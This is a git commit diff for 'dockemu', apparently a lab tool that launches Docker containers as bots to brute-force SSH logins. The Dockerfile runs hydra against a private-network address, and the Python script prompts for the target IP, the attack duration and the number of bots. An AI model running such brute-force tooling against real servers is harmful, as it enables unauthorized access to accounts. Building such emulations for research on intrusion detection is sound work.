23f537814a81b7506a35de0beda6da85887b4a41
Marcos Cano <mcano@stsa.info>
2015-02-06 14:50:53 -0600

    Fri Feb  6 14:50:53 CST 2015

--- Dockerfile
+++ Dockerfile
@@ -6,8 +6,8 @@ RUN apt-get update
 RUN apt-get -y install hydra openssh-server
 
 
-ADD docker/user_list
+ADD docker/user_list /
 ENV server 192.168.8.10
 
 #CMD echo $(date) > /var/log/lastlog && tail -f /var/log/lastlog
-CMD hydra -L user_list -V -x 4:4:aA1 $server ssh
+CMD hydra -L /user_list -V -x 4:4:aA1 $server ssh
--- dockemu.py
+++ dockemu.py
@@ -6,13 +6,46 @@ ROOT=os.path.dirname(os.path.abspath(__file__))
 
 bots=2
 image="dockemu"
+server="192.168.8.66"
+duration="10"
+delay="5"
 
+# number of bots
+print "####### WELCOME TO DOCKEMU V.1.0 ####### "
 try:
-	bots = input('How many bots do you need?')
-	print('Hello', bots)
+	bots = input('How many bots do you need? [defaults=%s]'%bots)
 except:
-	sys.exit(9)
+	print "[WARNING] bots not provided, using defaults (%s)"%bots
+	print
 
-cmd="echo %s"%bots
-p = subprocess.Popen(cmd , shell=True)
+#server to attack
+try:
+	server = input('Enter the IP of the server to attack? [defaults=%s]'%server)
+except:
+	print "[WARNING] server not provided, using defaults (%s)"%server
+	print 
+
+
+#duration of the experiment
+try:
+	duration = input('Enter the duration of the attack [defaults=%s]'%duration)
+except:
+	print "[WARNING] duration not provided, using defaults (%s)"%duration
+	print 
+
+
+#delay between docker bots 
+try:
+	delay = input('Enter the delay between each docker bot [defaults=%s]'%delay)
+except:
+	print "[WARNING] delay not provided, using defaults (%s)"%delay
+	print
+
+
+
+
+for i in range(bots):
+	cmd="docker run -d --name dockemu-%s -e  'server=%s' dockemu"
+	cmd="echo %s %s %s %s "%(bots,i, duration , delay)
+	p = subprocess.Popen(cmd , shell=True)
 
